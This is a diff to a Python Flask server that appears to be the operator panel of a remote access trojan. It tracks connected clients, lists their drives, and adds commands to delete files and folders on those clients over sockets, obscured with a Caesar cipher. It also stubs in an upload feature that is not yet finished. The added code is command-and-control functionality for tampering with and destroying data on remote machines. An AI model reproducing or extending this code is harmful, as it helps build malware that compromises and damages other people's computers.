@@ -4,6 +4,7 @@ from geoip import geolite2
 from flask import Flask, request, send_file, render_template, send_from_directory, jsonify
 from threading import Thread
 import os, sys, time
+import easygui
 import select
 import socket
 import logging
@@ -70,30 +71,63 @@ def index() :
     return send_file(index_path)
 
 path_file_ex = ""
+path_file_ex_2 = ""
+FILES_=[]
+CLIENT_IN_PATH = None
 
 @app.route('/interact', methods=['POST'])
 def interact() :
     file_list = request.get_json()["to_send"]
     action = file_list.pop(0)
     
+    if CLIENT_IN_PATH == None : return "no client"
+    client = CONNECT_CLIENTS[CLIENT_IN_PATH]
+    
     print(file_list)
+    
+    files = []
+    if action != "upload" :
+        for f in file_list :
+            files.append(f.split('">')[1].replace("</a>",""))
+
     match action :
         case "download" :
-            print("d")
+           print(files) 
 
         case "upload" :
-            print("u")
+            filename = easygui.fileopenbox()
+
+            if filename == None or path_file_ex_2 == "" :
+                return 'no file selected'
+
+            print(f"{filename} --> {path_file_ex_2}")
 
         case "remove" :
-            print("r")
+            for i in files :
+                path = path_file_ex_2 + i
+                if i in FILES_ :
+                    #call remove file
+                    client.send(CAESAR("del_file\0").encode())
+
+                    client.send(CAESAR(path + "\0").encode())
+
+                    time.sleep(0.05)
+                else :
+                    #call remove folder
+                    client.send(CAESAR("del_dir\0").encode())
+
+                    client.send(CAESAR(path + "\0").encode())
+
+                    time.sleep(0.05)
 
     return 'ok'
 
-FILES_=[]
 @app.route('/get_data', methods=['POST'])
 def get_data() :
     global path_file_ex
+    global path_file_ex_2
     global FILES_
+    global CLIENT_IN_PATH
     data = []
     
     got_path = request.get_data().decode("latin-1")
@@ -131,6 +165,7 @@ def get_data() :
             path_parts = path_file_ex.split("/")
             client_num = int(path_parts.pop(0).replace("Client n°",""))
             if client_num != i : continue
+
             client.send(CAESAR("get_drives").encode())
             drives = recv_message_ret(client).decode("utf-8")
             for d in drives :
@@ -143,7 +178,7 @@ def get_data() :
             client_num = int(path_parts.pop(0).replace("Client n°",""))
             if client_num != i : continue
             path_parts[0] = path_parts[0] + ":"
-            
+            CLIENT_IN_PATH = i
             if path_parts[len(path_parts)-2] in FILES_ :
                 path_parts.pop(len(path_parts)-2)
                 path_file_ex_parts = path_file_ex.split("/")
